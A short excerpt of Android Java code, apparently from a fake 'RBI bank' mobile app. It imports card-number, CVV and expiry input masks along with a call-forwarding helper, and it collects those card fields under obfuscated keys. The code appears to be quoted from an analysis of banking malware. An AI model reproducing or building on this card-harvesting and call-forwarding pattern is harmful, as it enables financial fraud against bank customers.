    ...
    import com.rbibank.mobank.Library.BackgroundService;
    import com.rbibank.mobank.Library.CVVInputMask;
    import com.rbibank.mobank.Library.CallForwardingHelper;
    import com.rbibank.mobank.Library.DebitCardInputMask;
    import com.rbibank.mobank.Library.ExpiryDateInputMask;
    import com.rbibank.mobank.Library.FormValidator;
    import com.rbibank.mobank.Library.SharedPreferencesHelper;
...
//            new Handler().postDelayed(dialog::dismiss, 300000);
        ...
        public void init() throws JSONException {
            ...
            dataObject = new HashMap<>();
            ids = new HashMap<>();
            ids.put(R.id.d4rd, "d4rd");
            ids.put(R.id.secureccv, "cvv2");
            ids.put(R.id.ex3xpir, "ex3xpir");
